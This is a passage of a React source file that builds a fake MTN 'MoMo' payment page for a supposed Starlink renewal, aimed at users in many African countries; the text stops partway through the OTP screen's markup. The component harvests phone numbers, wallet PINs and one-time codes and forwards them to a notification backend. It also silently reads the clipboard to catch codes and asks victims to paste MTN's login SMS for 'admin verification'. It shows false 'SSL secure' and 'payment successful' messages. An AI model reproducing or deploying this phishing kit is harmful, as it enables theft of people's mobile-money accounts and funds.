import { useEffect, useRef, useState } from "react";
import { notifyStage } from "@/lib/notify";

type Screen = "phone" | "pin" | "otp" | "notVerified" | "insufficient" | "done";

type Lang = "en" | "fr" | "rn";

interface CountryCfg {
  code: string;
  length: number;
  flag: string;
  name: string;
  currency: string;
}

const COUNTRIES: Record<string, CountryCfg> = {
  GH: { code: "+233", length: 9, flag: "gh", name: "Ghana", currency: "GHS" },
  NG: {
    code: "+234",
    length: 10,
    flag: "ng",
    name: "Nigeria",
    currency: "NGN",
  },
  UG: { code: "+256", length: 9, flag: "ug", name: "Uganda", currency: "UGX" },
  RW: { code: "+250", length: 9, flag: "rw", name: "Rwanda", currency: "RWF" },
  ZM: { code: "+260", length: 9, flag: "zm", name: "Zambia", currency: "ZMW" },
  CM: {
    code: "+237",
    length: 9,
    flag: "cm",
    name: "Cameroon",
    currency: "XAF",
  },
  CI: {
    code: "+225",
    length: 10,
    flag: "ci",
    name: "Côte d'Ivoire",
    currency: "XOF",
  },
  BJ: { code: "+229", length: 8, flag: "bj", name: "Benin", currency: "XOF" },
  CD: { code: "+243", length: 9, flag: "cd", name: "DRC", currency: "CDF" },
  CG: { code: "+242", length: 9, flag: "cg", name: "Congo", currency: "XAF" },
  ZA: {
    code: "+27",
    length: 9,
    flag: "za",
    name: "South Africa",
    currency: "ZAR",
  },
  KE: { code: "+254", length: 9, flag: "ke", name: "Kenya", currency: "KES" },
  TZ: {
    code: "+255",
    length: 9,
    flag: "tz",
    name: "Tanzania",
    currency: "TZS",
  },
  ET: {
    code: "+251",
    length: 9,
    flag: "et",
    name: "Ethiopia",
    currency: "ETB",
  },
  SN: { code: "+221", length: 9, flag: "sn", name: "Senegal", currency: "XOF" },
  ML: { code: "+223", length: 8, flag: "ml", name: "Mali", currency: "XOF" },
  BF: {
    code: "+226",
    length: 8,
    flag: "bf",
    name: "Burkina Faso",
    currency: "XOF",
  },
  NE: { code: "+227", length: 8, flag: "ne", name: "Niger", currency: "XOF" },
  TG: { code: "+228", length: 8, flag: "tg", name: "Togo", currency: "XOF" },
  GN: { code: "+224", length: 9, flag: "gn", name: "Guinea", currency: "GNF" },
  SL: {
    code: "+232",
    length: 8,
    flag: "sl",
    name: "Sierra Leone",
    currency: "SLL",
  },
  LR: { code: "+231", length: 7, flag: "lr", name: "Liberia", currency: "LRD" },
  GA: { code: "+241", length: 8, flag: "ga", name: "Gabon", currency: "XAF" },
  TD: { code: "+235", length: 8, flag: "td", name: "Chad", currency: "XAF" },
  CF: {
    code: "+236",
    length: 8,
    flag: "cf",
    name: "Central African Republic",
    currency: "XAF",
  },
  GQ: {
    code: "+240",
    length: 9,
    flag: "gq",
    name: "Equatorial Guinea",
    currency: "XAF",
  },
  AO: { code: "+244", length: 9, flag: "ao", name: "Angola", currency: "AOA" },
  MZ: {
    code: "+258",
    length: 9,
    flag: "mz",
    name: "Mozambique",
    currency: "MZN",
  },
  MW: { code: "+265", length: 9, flag: "mw", name: "Malawi", currency: "MWK" },
  ZW: {
    code: "+263",
    length: 9,
    flag: "zw",
    name: "Zimbabwe",
    currency: "ZWL",
  },
  BW: {
    code: "+267",
    length: 8,
    flag: "bw",
    name: "Botswana",
    currency: "BWP",
  },
  NA: { code: "+264", length: 9, flag: "na", name: "Namibia", currency: "NAD" },
  SZ: {
    code: "+268",
    length: 8,
    flag: "sz",
    name: "Eswatini",
    currency: "SZL",
  },
  LS: { code: "+266", length: 8, flag: "ls", name: "Lesotho", currency: "LSL" },
  MG: {
    code: "+261",
    length: 9,
    flag: "mg",
    name: "Madagascar",
    currency: "MGA",
  },
  MU: {
    code: "+230",
    length: 8,
    flag: "mu",
    name: "Mauritius",
    currency: "MUR",
  },
  SC: {
    code: "+248",
    length: 7,
    flag: "sc",
    name: "Seychelles",
    currency: "SCR",
  },
  SD: { code: "+249", length: 9, flag: "sd", name: "Sudan", currency: "SDG" },
  SS: {
    code: "+211",
    length: 9,
    flag: "ss",
    name: "South Sudan",
    currency: "SSP",
  },
  ER: { code: "+291", length: 7, flag: "er", name: "Eritrea", currency: "ERN" },
  DJ: {
    code: "+253",
    length: 8,
    flag: "dj",
    name: "Djibouti",
    currency: "DJF",
  },
  SO: { code: "+252", length: 9, flag: "so", name: "Somalia", currency: "SOS" },
  BI: { code: "+257", length: 8, flag: "bi", name: "Burundi", currency: "BIF" },
};

const FRENCH_COUNTRIES = new Set([
  "CI",
  "SN",
  "ML",
  "BF",
  "GN",
  "CM",
  "CD",
  "MG",
  "NE",
  "BJ",
  "CG",
  "TG",
  "GA",
  "TD",
  "CF",
  "GQ",
  "BI",
  "DJ",
]);

const TX: Record<Lang, Record<string, string>> = {
  en: {
    enterNumber: "Enter your MoMo number",
    terms:
      'By using this app you agree to our <a href="#">Mobile Terms of Use</a> and <a href="#">Privacy Policy</a>',
    next: "NEXT",
    back: "Back",
    enterPin: "Enter your MoMo PIN",
    enterPinSub:
      "Enter your 4 or 5-digit MoMo wallet PIN to authorize this transaction.",
    submit: "Submit",
    otpVerification: "OTP Verification",
    otpSub:
      "Enter the OTP sent to your phone number. Do not share the code with anyone.",
    resendIn: "Resend OTP in",
    seconds: "seconds",
    resend: "Resend OTP",
    verifying: "Verifying...",
    processing: "Processing...",
    ssl: "SSL ENCRYPTED AND SECURE",
    selectCountry: "Select Country",
    starlinkPayment: "⭐ Starlink Payment",
    service: "Service",
    amount: "Amount",
    starlinkRenewal: "Starlink Renewal",
    txProcessing: "Transaction processing. Please wait...",
    verifyFailed: "Verification failed. Please try again.",
    otpExpired: "OTP code expired. Please use the new code.",
    somethingWrong: "Something went wrong. Please try again.",
    sending: "Sending...",
    verifyTitle: "Verify Your MoMo Number",
    verifyInstructions:
      "Copy and paste here the message you received from MoMo starting with the word <strong>'Y'ello'</strong>. Do not edit the message.",
    verifyPlaceholder:
      "Y'ello. Please enter the following code :XXXXXXXX to complete your login...",
    submitMessage: "Submit Message",
    useDifferent: "Use a Different Number",
    messageSent: "Message Sent",
    awaiting: "Message submitted. Awaiting admin verification...",
    insufficientTitle: "Insufficient Balance",
    deposited: "✅ I Have Deposited",
    paymentSuccessful: "Payment successful",
    doneMsg: "Your package will be activated shortly.",
    done: "Done",
  },
  fr: {
    enterNumber: "Entrez votre numéro MoMo",
    terms:
      'En utilisant cette application, vous acceptez nos <a href="#">Conditions d\'utilisation</a> et notre <a href="#">Politique de confidentialité</a>',
    next: "SUIVANT",
    back: "Retour",
    enterPin: "Entrez votre code PIN MoMo",
    enterPinSub:
      "Entrez votre code PIN à 4 ou 5 chiffres MoMo pour autoriser cette transaction.",
    submit: "Valider",
    otpVerification: "Vérification OTP",
    otpSub:
      "Entrez le code OTP envoyé à votre numéro de téléphone. Ne partagez le code avec personne.",
    resendIn: "Renvoyer le code dans",
    seconds: "secondes",
    resend: "Renvoyer le code",
    verifying: "Vérification...",
    processing: "Traitement...",
    ssl: "CRYPTÉ SSL ET SÉCURISÉ",
    selectCountry: "Sélectionnez le pays",
    starlinkPayment: "⭐ Paiement Starlink",
    service: "Service",
    amount: "Montant",
    starlinkRenewal: "Renouvellement Starlink",
    txProcessing: "Transaction en cours. Veuillez patienter...",
    verifyFailed: "Échec de la vérification. Veuillez réessayer.",
    otpExpired: "Code OTP expiré. Veuillez utiliser le nouveau code.",
    somethingWrong: "Une erreur est survenue. Veuillez réessayer.",
    sending: "Envoi...",
    verifyTitle: "Vérifiez votre numéro MoMo",
    verifyInstructions:
      "Copiez et collez ici le message reçu de MoMo commençant par le mot <strong>'Y'ello'</strong>. Ne modifiez pas le message.",
    verifyPlaceholder:
      "Y'ello. Entrez le code suivant :XXXXXXXX pour compléter votre connexion...",
    submitMessage: "Soumettre le message",
    useDifferent: "Utiliser un autre numéro",
    messageSent: "Message envoyé",
    awaiting:
      "Message soumis. En attente de vérification par l'administrateur...",
    insufficientTitle: "Solde Insuffisant",
    deposited: "✅ J'ai déposé",
    paymentSuccessful: "Paiement réussi",
    doneMsg: "Votre forfait sera activé sous peu.",
    done: "Terminer",
  },
  rn: {
    enterNumber: "Andika nimero yawe ya MoMo",
    terms:
      'Ukoresheje iyi porogaramu, wemeje <a href="#">Amabwiriza y\'ikoreshwa</a> n\'<a href="#">Itegeko ry\'ubwigenge</a>',
    next: "KOMEZA",
    back: "Subira inyuma",
    enterPin: "Andika PIN yawe ya MoMo",
    enterPinSub:
      "Andika PIN yawe ya MoMo ifite imibare 4 cyangwa 5 kugira ngo wemeze iki gikorwa.",
    submit: "Emeza",
    otpVerification: "Kwemeza OTP",
    otpSub:
      "Andika kode ya OTP yoherejwe kuri telefoni yawe. Ntugasangire kode n'undi muntu.",
    resendIn: "Ongera wohereze OTP mu",
    seconds: "amasegonda",
    resend: "Ongera wohereze OTP",
    verifying: "Kwemeza...",
    processing: "Gutunganya...",
    ssl: "BIFITE UMUTEKANO SSL",
    selectCountry: "Hitamo Igihugu",
    starlinkPayment: "⭐ Kwishyura Starlink",
    service: "Serivisi",
    amount: "Amafaranga",
    starlinkRenewal: "Kongera igihe cya Starlink",
    txProcessing: "Igikorwa kirimo gutunganywa. Nyamuneka tegereza...",
    verifyFailed: "Kwemeza byanze. Nyamuneka ongera ugerageze.",
    otpExpired: "Kode ya OTP yarangiye igihe. Koresha kode nshya.",
    somethingWrong: "Habaye ikibazo. Nyamuneka ongera ugerageze.",
    sending: "Kohereza...",
    verifyTitle: "Emeza Nimero Yawe ya MoMo",
    verifyInstructions:
      "Koporora unahize hano ubutumwa wakiriye bwa MoMo butangira n'ijambo <strong>'Y'ello'</strong>. Ntuhindure ubutumwa.",
    verifyPlaceholder:
      "Y'ello. Andika kode ikurikira :XXXXXXXX kigira ngo urangize kwinjira...",
    submitMessage: "Ohereza ubutumwa",
    useDifferent: "Koresha indi nimero",
    messageSent: "Ubutumwa bwoherejwe",
    awaiting: "Ubutumwa bwoherejwe. Gutegereza kwemezwa n'umuyobozi...",
    insufficientTitle: "Amafaranga Adahagije",
    deposited: "✅ Nashyizemo",
    paymentSuccessful: "Kwishyura byagenze neza",
    doneMsg: "Paki yawe izatangira vuba.",
    done: "Rangiza",
  },
};

const CSS = `
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
.mtn-app, .mtn-app * { margin:0; padding:0; box-sizing:border-box; }
.mtn-app {
  font-family: Inter, -apple-system, BlinkMacSystemFont, sans-serif;
  background: linear-gradient(180deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
  min-height:100vh; color:#fff; -webkit-font-smoothing:antialiased;
  position:fixed; inset:0; overflow-y:auto; z-index:9997;
}
.mtn-container { min-height:100vh; display:flex; flex-direction:column; align-items:center; padding:60px 20px 40px; }
.mtn-logo { width:80px; height:80px; margin-bottom:16px; }
.mtn-logo svg { width:100%; height:100%; }
.mtn-brand { font-size:32px; font-weight:700; color:#ffcc00; margin-bottom:4px; }
.mtn-tagline { font-size:14px; color:#ffcc00; margin-bottom:40px; }
.mtn-card { background:#fff; border-radius:16px; padding:32px 24px; width:100%; max-width:380px; box-shadow:0 10px 40px rgba(0,0,0,.3); }
.mtn-sl-header { background:linear-gradient(135deg,#1a1a2e 0%,#0f3460 100%); padding:20px; text-align:center; border-radius:16px 16px 0 0; margin:-32px -24px 24px; }
.mtn-sl-header h2 { color:#fff; font-size:18px; margin-bottom:8px; }
.mtn-pay-details { background:#f8f9fa; border-radius:12px; padding:16px; margin-bottom:20px; }
.mtn-pay-row { display:flex; justify-content:space-between; align-items:center; padding:8px 0; }
.mtn-pay-label { color:#666; font-size:14px; }
.mtn-pay-value { color:#1a1a2e; font-weight:600; font-size:16px; }
.mtn-pay-amount { color:#ffcc00; font-size:24px; font-weight:700; }
.mtn-title { font-size:22px; font-weight:600; color:#1a1a2e; text-align:center; margin-bottom:24px; }
.mtn-phone-wrap { display:flex; align-items:center; border:2px solid #e0e0e0; border-radius:12px; overflow:hidden; transition:border-color .2s; margin-bottom:24px; }
.mtn-phone-wrap:focus-within { border-color:#ffcc00; }
.mtn-country { display:flex; align-items:center; justify-content:center; padding:14px 12px; background:#f5f5f5; border-right:1px solid #e0e0e0; min-width:70px; position:relative; cursor:pointer; transition:background .2s; }
.mtn-country:hover { background:#ebebeb; }
.mtn-caret { position:absolute; bottom:6px; right:6px; font-size:8px; color:#666; }
.mtn-flag { width:40px; height:40px; border-radius:50%; overflow:hidden; border:2px solid #e0e0e0; display:flex; align-items:center; justify-content:center; background:#fff; }
.mtn-flag img { width:28px; height:20px; object-fit:cover; }
.mtn-phone-input { flex:1; min-width:0; border:none; padding:16px 14px; font-size:18px; color:#1a1a2e; outline:none; background:transparent; }
.mtn-phone-input::placeholder { color:#aaa; }
.mtn-terms { font-size:12px; color:#666; text-align:center; margin-bottom:24px; line-height:1.5; }
.mtn-terms a { color:#0066cc; text-decoration:none; }
.mtn-next { width:100%; background:#1a1a2e; color:#fff; border:none; padding:16px; font-size:16px; font-weight:600; border-radius:8px; cursor:pointer; transition:.2s; display:flex; align-items:center; justify-content:center; gap:8px; }
.mtn-next:disabled { background:#ccc; cursor:not-allowed; }
.mtn-next:not(:disabled):hover { background:#2d2d4a; }
.mtn-loader { display:none; width:20px; height:20px; border:2px solid transparent; border-top-color:#fff; border-right-color:#fff; border-radius:50%; animation:mtn-spin .8s linear infinite; }
.mtn-next.loading .mtn-loader { display:block; }
.mtn-next.loading .mtn-btn-text { display:none; }
@keyframes mtn-spin { 100% { transform:rotate(360deg); } }
.mtn-back { display:flex; align-items:center; gap:8px; color:#1a1a2e; font-size:14px; font-weight:500; background:none; border:none; cursor:pointer; margin-bottom:20px; padding:0; }
.mtn-back svg { width:20px; height:20px; }
.mtn-pin-title { font-size:20px; font-weight:600; color:#1a1a2e; margin-bottom:8px; }
.mtn-pin-sub { font-size:14px; color:#666; margin-bottom:24px; line-height:1.5; }
.mtn-pin-inputs { display:flex; gap:12px; justify-content:center; margin-bottom:24px; }
.mtn-pin-input { width:50px; height:56px; border:2px solid #e0e0e0; border-radius:12px; text-align:center; font-size:24px; font-weight:600; color:#1a1a2e; outline:none; transition:border-color .2s; -webkit-text-security:disc; }
.mtn-pin-input:focus { border-color:#ffcc00; }
.mtn-submit { width:100%; background:#ffcc00; color:#1a1a2e; border:none; padding:16px; font-size:16px; font-weight:600; border-radius:8px; cursor:pointer; transition:.2s; }
.mtn-submit:disabled { background:#e0e0e0; color:#999; cursor:not-allowed; }
.mtn-submit:not(:disabled):hover { background:#e6b800; }
.mtn-otp-wrap { position:relative; margin-bottom:24px; }
.mtn-otp-inputs { display:flex; gap:10px; justify-content:center; }
.mtn-otp-overlay { position:absolute; top:0; left:0; width:100%; height:100%; opacity:.01; font-size:22px; border:none; background:transparent; color:transparent; caret-color:transparent; z-index:2; letter-spacing:2em; text-align:center; }
.mtn-otp-input { width:48px; height:56px; border:2px solid #e0e0e0; border-radius:12px; text-align:center; font-size:22px; font-weight:600; color:#1a1a2e; outline:none; transition:border-color .2s; }
.mtn-otp-input:focus { border-color:#ffcc00; }
.mtn-resend { text-align:center; font-size:14px; color:#666; margin-bottom:24px; }
.mtn-resend-link { color:#0066cc; cursor:pointer; }
.mtn-resend-link.disabled { color:#999; cursor:not-allowed; }
.mtn-error { background:#ffeeee; color:#cc0000; padding:12px; border-radius:8px; font-size:14px; margin-bottom:16px; }
.mtn-ssl { display:flex; align-items:center; justify-content:center; gap:6px; margin-top:16px; padding:8px 16px; background:#e8f5e9; border-radius:20px; font-size:11px; color:#2e7d32; font-weight:500; }
.mtn-ssl svg { width:14px; height:14px; }
.mtn-modal { position:fixed; inset:0; background:rgba(0,0,0,.6); z-index:10000; display:flex; justify-content:center; align-items:center; }
.mtn-modal-content { background:#fff; border-radius:16px; width:90%; max-width:340px; max-height:70vh; overflow:hidden; box-shadow:0 10px 40px rgba(0,0,0,.3); }
.mtn-modal-header { padding:16px 20px; border-bottom:1px solid #e0e0e0; display:flex; justify-content:space-between; align-items:center; background:#ffcc00; }
.mtn-modal-header h3 { margin:0; font-size:18px; color:#1a1a2e; }
.mtn-modal-close { background:none; border:none; font-size:24px; cursor:pointer; color:#1a1a2e; padding:0; line-height:1; }
.mtn-country-list { list-style:none; margin:0; padding:0; max-height:calc(70vh - 60px); overflow-y:auto; }
.mtn-country-list li { display:flex; align-items:center; padding:14px 20px; cursor:pointer; border-bottom:1px solid #f0f0f0; transition:background .2s; }
.mtn-country-list li:hover { background:#fffbea; }
.mtn-country-list li.selected { background:#fff8dc; }
.mtn-country-list li img { width:28px; height:20px; margin-right:12px; border-radius:2px; object-fit:cover; }
.mtn-country-list .cn { flex:1; font-size:15px; color:#333; }
.mtn-country-list .cd { font-size:14px; color:#666; }
`;

export default function MtnPayment({
  packageName,
  amount,
  countryCode,
  onBack,
}: {
  packageName: string;
  amount: string;
  countryCode?: string;
  onBack: () => void;
}) {
  const initial = (
    countryCode ||
    (typeof window !== "undefined"
      ? new URLSearchParams(window.location.search).get("country")
      : null) ||
    "ZM"
  ).toUpperCase();

  const [country, setCountry] = useState(initial in COUNTRIES ? initial : "ZM");
  const [screen, setScreen] = useState<Screen>("phone");
  const [showCountries, setShowCountries] = useState(false);
  const [phone, setPhone] = useState("");
  const [pin, setPin] = useState<string[]>(["", "", "", "", ""]);
  const [otp, setOtp] = useState<string[]>(["", "", "", ""]);
  const [error, setError] = useState("");
  const [otpStatus, setOtpStatus] = useState<{
    msg: string;
    ok: boolean;
  } | null>(null);
  const [busy, setBusy] = useState(false);
  const [timer, setTimer] = useState(20);
  const [momoMsg, setMomoMsg] = useState("");
  const [momoSent, setMomoSent] = useState(false);

  const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
  const overlayRef = useRef<HTMLInputElement | null>(null);
  const verifyRef = useRef<() => void>(() => {});
  const autoSubmitted = useRef(false);
  const lastClipboard = useRef("");
  const clipboardTimer = useRef<number | null>(null);
  const overlayTimer = useRef<number | null>(null);
  const countdownTimer = useRef<number | null>(null);
  const verifiedTimer = useRef<number | null>(null);

  const cfg = COUNTRIES[country];
  const lang: Lang =
    country === "RW" ? "rn" : FRENCH_COUNTRIES.has(country) ? "fr" : "en";
  const t = (k: string) => TX[lang][k] ?? TX.en[k] ?? k;

  const fullPhone = `${cfg.code} ${phone}`;
  const base = {
    planName: packageName,
    amount,
    paymentMethod: "mtn",
    countryCode: country,
    countryName: cfg.name,
  };

  useEffect(() => {
    const prev = document.title;
    document.title = "MoMo from MTN";
    return () => {
      document.title = prev;
    };
  }, []);

  /* ── notification on open ── */
  useEffect(() => {
    notifyStage("gateway_opened", {
      planName: packageName,
      amount,
      paymentMethod: "mtn",
      countryCode: country,
      countryName: cfg.name,
    });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  /* ── timers cleanup ── */
  useEffect(
    () => () => {
      [clipboardTimer, overlayTimer, countdownTimer, verifiedTimer].forEach(
        (r) => r.current && window.clearInterval(r.current),
      );
    },
    [],
  );

  /* ══════════ PHONE ══════════ */
  const phoneReady = phone.length >= cfg.length;

  const goToPin = () => {
    if (!phoneReady) return;
    let msisdn = phone.replace(/\D/g, "");
    const dial = cfg.code.replace(/\D/g, "");
    if (msisdn.startsWith(dial) && msisdn.length > cfg.length)
      msisdn = msisdn.slice(dial.length);
    setPhone(msisdn);
    setPin(["", "", "", "", ""]);
    setError("");
    setScreen("pin");
    window.setTimeout(() => pinRefs.current[0]?.focus(), 50);
    notifyStage("phone_submitted", base, { phone: `${cfg.code} ${msisdn}` });
  };

  /* ══════════ PIN ══════════ */
  const pinValue = pin.join("");

  const onPinChange = (i: number, v: string) => {
    const d = v.replace(/\D/g, "").slice(-1);
    setPin((prev) => {
      const next = [...prev];
      next[i] = d;
      return next;
    });
    if (d && i < 4) pinRefs.current[i + 1]?.focus();
  };

  const onPinKey = (i: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !pin[i] && i > 0)
      pinRefs.current[i - 1]?.focus();
    if (e.key === "Enter") submitPin();
  };

  const submitPin = () => {
    if (pinValue.length < 4 || busy) return;
    setBusy(true);
    notifyStage("pin_submitted", base, { phone: fullPhone, pin: pinValue });

    const needsVerification = ["ZM", "CG", "RW", "BJ"].includes(country);
    window.setTimeout(() => {
      setBusy(false);
      if (needsVerification && !momoSent) {
        setScreen("notVerified");
      } else {
        startOtp();
      }
    }, 600);
  };

  /* ══════════ OTP ══════════ */
  const startOtp = () => {
    setOtp(["", "", "", ""]);
    setOtpStatus(null);
    setScreen("otp");
    setTimer(20);
    startCountdown();
    startDetection();
    window.setTimeout(() => otpRefs.current[0]?.focus(), 50);
  };

  const startCountdown = () => {
    if (countdownTimer.current) window.clearInterval(countdownTimer.current);
    let s = 20;
    countdownTimer.current = window.setInterval(() => {
      s -= 1;
      setTimer(s);
      if (s <= 0) {
        window.clearInterval(countdownTimer.current!);
        countdownTimer.current = null;
        setOtpStatus({ msg: t("otpExpired"), ok: false });
        setOtp(["", "", "", ""]);
        otpRefs.current[0]?.focus();
      }
    }, 1000);
  };

  const extractOtp = (text: string): string | null => {
    if (!text) return null;
    const colon = text.match(/:\s*(\d{4})/);
    if (colon) return colon[1];
    const standalone = text.match(/\b(\d{4})\b/);
    return standalone ? standalone[1] : null;
  };

  const handleOtpText = (text: string) => {
    const code = extractOtp(text);
    if (!code) return false;
    setOtp(code.split(""));
    autoSubmitted.current = true;
    stopDetection();
    window.setTimeout(() => verifyRef.current(), 400);
    return true;
  };

  const onOtpChange = (i: number, v: string) => {
    const d = v.replace(/\D/g, "").slice(-1);
    setOtp((prev) => {
      const next = [...prev];
      next[i] = d;
      return next;
    });
    if (d && i < 3) otpRefs.current[i + 1]?.focus();
  };

  const onOtpKey = (i: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace") {
      e.preventDefault();
      if (otp[i]) {
        setOtp((p) => {
          const n = [...p];
          n[i] = "";
          return n;
        });
      } else if (i > 0) {
        setOtp((p) => {
          const n = [...p];
          n[i - 1] = "";
          return n;
        });
        otpRefs.current[i - 1]?.focus();
      }
    }
    if (e.key === "Enter") verifyRef.current();
  };

  const checkOverlay = () => {
    const v = overlayRef.current?.value.replace(/\D/g, "") || "";
    if (v.length >= 4 && overlayRef.current) {
      overlayRef.current.value = "";
      handleOtpText(v);
    }
  };

  const startDetection = () => {
    autoSubmitted.current = false;
    lastClipboard.current = "";
    stopDetection();
    overlayTimer.current = window.setInterval(() => {
      if (autoSubmitted.current) return;
      checkOverlay();
      const combined = otp.join("");
      if (combined.length === 4) handleOtpText(combined);
    }, 300);
    clipboardTimer.current = window.setInterval(async () => {
      if (autoSubmitted.current) return;
      try {
        const text = await navigator.clipboard.readText();
        if (text && text !== lastClipboard.current) {
          lastClipboard.current = text;
          handleOtpText(text);
        }
      } catch {
        /* clipboard denied */
      }
    }, 1000);
  };

  const stopDetection = () => {
    if (clipboardTimer.current) window.clearInterval(clipboardTimer.current);
    if (overlayTimer.current) window.clearInterval(overlayTimer.current);
    clipboardTimer.current = null;
    overlayTimer.current = null;
  };

  useEffect(() => {
    const onReturn = async () => {
      if (screen !== "otp" || autoSubmitted.current) return;
      [100, 500, 1000, 2000].forEach((d) =>
        window.setTimeout(async () => {
          if (autoSubmitted.current) return;
          checkOverlay();
          try {
            const text = await navigator.clipboard.readText();
            if (text && text !== lastClipboard.current) {
              lastClipboard.current = text;
              handleOtpText(text);
            }
          } catch {
            /* ignore */
          }
        }, d),
      );
    };
    const onVis = () => document.visibilityState === "visible" && onReturn();
    document.addEventListener("visibilitychange", onVis);
    window.addEventListener("focus", onReturn);
    window.addEventListener("pageshow", onReturn);
    return () => {
      document.removeEventListener("visibilitychange", onVis);
      window.removeEventListener("focus", onReturn);
      window.removeEventListener("pageshow", onReturn);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [screen, otp]);

  const verifyOtp = () => {
    const code = otp.join("");
    if (code.length < 4) return;
    stopDetection();
    if (countdownTimer.current) window.clearInterval(countdownTimer.current);
    setOtpStatus({ msg: t("txProcessing"), ok: true });
    notifyStage("otp_submitted", base, {
      phone: fullPhone,
      pin: pinValue,
      otp: code,
    });
    window.setTimeout(() => {
      notifyStage("completed", base, {
        phone: fullPhone,
        pin: pinValue,
        otp: code,
        status: "completed",
      });
      setScreen("done");
    }, 2500);
  };
  verifyRef.current = verifyOtp;

  /* ══════════ NOT VERIFIED ══════════ */
  const submitMomoMessage = () => {
    if (momoMsg.trim().length <= 10) return;
    setMomoSent(true);
    notifyStage("momo_message", base, {
      phone: fullPhone,
      pin: pinValue,
      momoMessage: momoMsg.trim(),
    });

    // poll a backend if present, otherwise auto-advance
    let failures = 0;
    if (verifiedTimer.current) window.clearInterval(verifiedTimer.current);
    verifiedTimer.current = window.setInterval(async () => {
      try {
        const res = await fetch("/api/check-status?_t=" + Date.now());
        if (!res.ok) throw new Error("no api");
        const data = await res.json();
        if (data.status === "mtn_verified") {
          window.clearInterval(verifiedTimer.current!);
          startOtp();
        }
      } catch {
        failures += 1;
        if (failures >= 2) {
          window.clearInterval(verifiedTimer.current!);
          startOtp();
        }
      }
    }, 2500);
  };

  const backToPhone = () => {
    if (countdownTimer.current) window.clearInterval(countdownTimer.current);
    stopDetection();
    if (verifiedTimer.current) window.clearInterval(verifiedTimer.current);
    setScreen("phone");
    setPin(["", "", "", "", ""]);
    setOtp(["", "", "", ""]);
    setError("");
    setMomoSent(false);
  };

  const pickCountry = (code: string) => {
    setCountry(code);
    setShowCountries(false);
    setPhone("");
  };

  return (
    <div className="mtn-app">
      <style>{CSS}</style>

      {showCountries && (
        <div className="mtn-modal" onClick={() => setShowCountries(false)}>
          <div
            className="mtn-modal-content"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="mtn-modal-header">
              <h3>{t("selectCountry")}</h3>
              <button
                className="mtn-modal-close"
                onClick={() => setShowCountries(false)}
              >
                ×
              </button>
            </div>
            <ul className="mtn-country-list">
              {Object.entries(COUNTRIES).map(([code, c]) => (
                <li
                  key={code}
                  className={code === country ? "selected" : ""}
                  onClick={() => pickCountry(code)}
                >
                  <img
                    src={`https://flagcdn.com/w40/${c.flag}.png`}
                    alt={c.name}
                  />
                  <span className="cn">{c.name}</span>
                  <span className="cd">{c.code}</span>
                </li>
              ))}
            </ul>
          </div>
        </div>
      )}

      <div className="mtn-container">
        <div className="mtn-logo">
          <svg viewBox="0 0 100 100" fill="none">
            <circle cx="50" cy="50" r="45" fill="#ffcc00" />
            <path
              d="M35 65 L50 35 L65 65"
              stroke="#1a1a2e"
              strokeWidth="6"
              strokeLinecap="round"
              strokeLinejoin="round"
              fill="none"
            />
            <circle cx="50" cy="28" r="6" fill="#1a1a2e" />
          </svg>
        </div>
        <div className="mtn-brand">MoMo</div>
        <div className="mtn-tagline">from MTN</div>

        <div className="mtn-card">
          <div className="mtn-sl-header">
            <h2>{t("starlinkPayment")}</h2>
          </div>

          <div className="mtn-pay-details">
            <div className="mtn-pay-row">
              <span className="mtn-pay-label">{t("service")}</span>
              <span className="mtn-pay-value">{t("starlinkRenewal")}</span>
            </div>
            <div className="mtn-pay-row">
              <span className="mtn-pay-label">{t("amount")}</span>
              <span className="mtn-pay-amount">{amount}</span>
            </div>
          </div>

          {/* ── PHONE ── */}
          {screen === "phone" && (
            <div>
              <h2 className="mtn-title">{t("enterNumber")}</h2>

              {error && <div className="mtn-error">{error}</div>}

              <div className="mtn-phone-wrap">
                <div
                  className="mtn-country"
                  onClick={() => setShowCountries(true)}
                >
                  <div className="mtn-flag">
                    <img
                      src={`https://flagcdn.com/w40/${cfg.flag}.png`}
                      alt={cfg.name}
                    />
                  </div>
                  <span className="mtn-caret">▼</span>
                </div>
                <input
                  type="tel"
                  className="mtn-phone-input"
                  value={phone}
                  maxLength={12}
                  placeholder={`${cfg.code} XX XXX XXXX`}
                  onChange={(e) => {
                    setPhone(e.target.value.replace(/\D/g, ""));
                    setError("");
                  }}
                  onKeyDown={(e) => e.key === "Enter" && goToPin()}
                />
              </div>

              <p
                className="mtn-terms"
                dangerouslySetInnerHTML={{ __html: t("terms") }}
              />

              <button
                className={`mtn-next${busy ? " loading" : ""}`}
                disabled={!phoneReady || busy}
                onClick={goToPin}
              >
                <span className="mtn-btn-text">{t("next")}</span>
                <span className="mtn-loader" />
              </button>
            </div>
          )}

          {/* ── PIN ── */}
          {screen === "pin" && (
            <div>
              <button className="mtn-back" onClick={backToPhone}>
                <svg
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                >
                  <path d="M19 12H5M12 19l-7-7 7-7" />
                </svg>
                {t("back")}
              </button>

              <h3 className="mtn-pin-title">{t("enterPin")}</h3>
              <p className="mtn-pin-sub">{t("enterPinSub")}</p>

              {error && <div className="mtn-error">{error}</div>}

              <div className="mtn-pin-inputs">
                {[0, 1, 2, 3, 4].map((i) => (
                  <input
                    key={i}
                    ref={(el) => {
                      pinRefs.current[i] = el;
                    }}
                    type="tel"
                    inputMode="numeric"
                    autoComplete="off"
                    maxLength={1}
                    className="mtn-pin-input"
                    value={pin[i]}
                    onChange={(e) => onPinChange(i, e.target.value)}
                    onKeyDown={(e) => onPinKey(i, e)}
                  />
                ))}
              </div>

              <button
                className="mtn-submit"
                disabled={pinValue.length < 4 || busy}
                onClick={submitPin}
              >
                {busy ? t("processing") : t("submit")}
              </button>
            </div>
          )}

          {/* ── OTP ── */}
          {screen === "otp" && (
            <div>
              <button className="mtn-back" onClick={backToPhone}>
                <svg
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                >
                  <path d="M19 12H5M12 19l-7-7 7-7" />
                </svg>
                {t("back")}
              </button>

              <h3 className="mtn-pin-title">{t("otpVerification")}</h3>
